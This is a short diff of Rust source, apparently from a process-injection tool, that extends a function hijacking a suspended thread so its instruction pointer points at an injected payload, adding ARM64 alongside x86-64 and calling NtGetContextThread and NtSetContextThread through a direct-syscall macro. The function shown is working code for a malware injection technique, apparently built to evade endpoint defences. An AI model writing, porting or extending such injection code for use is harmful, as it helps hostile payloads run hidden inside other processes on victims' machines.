@@ -1450,7 +1450,7 @@ unsafe fn map_section_to_target(h_section: usize, process_handle: usize) -> Resu
 
 // ── Thread context manipulation ──────────────────────────────────────────────
 
-/// Redirect a suspended thread's RIP to the payload address.
+/// Redirect a suspended thread's instruction pointer to the payload address.
 unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
     use winapi::um::winnt::CONTEXT;
 
@@ -1466,8 +1466,14 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
         return Err("NtGetContextThread failed".to_string());
     }
 
-    // Set RIP to the payload address.
-    ctx.Rip = payload_addr as u64;
+    #[cfg(target_arch = "x86_64")]
+    {
+        ctx.Rip = payload_addr as u64;
+    }
+    #[cfg(target_arch = "aarch64")]
+    {
+        ctx.Pc = payload_addr as u64;
+    }
 
     let status = crate::syscall!(
         "NtSetContextThread",
@@ -1479,7 +1485,7 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
     }
 
     log::debug!(
-        "injection_transacted: redirected thread RIP to {:#x}",
+        "injection_transacted: redirected thread instruction pointer to {:#x}",
         payload_addr
     );
     Ok(())
